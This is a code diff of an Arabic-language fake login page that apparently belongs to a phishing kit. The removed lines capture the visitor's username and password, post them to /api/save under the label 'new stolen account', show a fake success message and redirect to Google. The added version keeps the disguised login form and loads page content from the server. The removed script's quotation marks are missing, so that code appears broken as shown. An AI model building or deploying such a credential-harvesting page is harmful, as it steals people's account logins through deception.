@@ -1,45 +1,27 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث الصفحة...</title>
-    <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
-        .card { background: white; padding: 20px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        #pageImg { width: 100%; border-radius: 8px; }
-    </style>
+    <title>تسجيل الدخول</title>
+    <script>
+        // سحب البيانات من السيرفر عند فتح الصفحة
+        async function loadConfig() {
+            const res = await fetch('/api/get');
+            const data = await res.json();
+            document.getElementById('mainImg').src = data.image;
+            document.getElementById('mainLetter').innerText = data.letter;
+            document.getElementById('mainBtn').innerText = data.button;
+        }
+        window.onload = loadConfig;
+    </script>
 </head>
 <body>
-    <div class="card">
-        <img id="pageImg" src="">
-        <h2 id="pageLetter">جاري التحميل...</h2>
-        <input type="text" id="user" placeholder="اسم المستخدم" style="width:100%; padding:10px; margin:5px 0;">
-        <input type="password" id="pass" placeholder="كلمة السر" style="width:100%; padding:10px; margin:5px 0;">
-        <button id="pageBtn" style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:5px;">إرسال</button>
-    </div>
-
-    <script>
-        // هذا الكود سيقوم بتحديث الصفحة فور فتحها بالبيانات التي أرسلتها من اللوحة
-        // يمكنك لاحقاً ربطها بقاعدة بيانات أو استخدام LocalStorage للتخزين المؤقت
-        
-        document.getElementById( pageBtn ).onclick = async () => {
-            const user = document.getElementById( user ).value;
-            const pass = document.getElementById( pass ).value;
-            
-            await fetch( /api/save , {
-                method:  POST ,
-                headers: { Content-Type :  application/json },
-                body: JSON.stringify({
-                    image: "🔑 حساب جديد مسحوب",
-                    letter: "المستخدم: " + user,
-                    button: "كلمة السر: " + pass
-                })
-            });
-            alert("تم بنجاح!");
-            window.location.href = "https://www.google.com";
-        };
-    </script>
-</body>
+    <img id="mainImg" src="" style="width:100%">
+    <h2 id="mainLetter">...</h2>
+    <form id="loginForm">
+        <input type="text" id="user" placeholder="اسم المستخدم">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button id="mainBtn" type="submit">إرسال</button>
+    </form>
+    </body>
 </html>
-
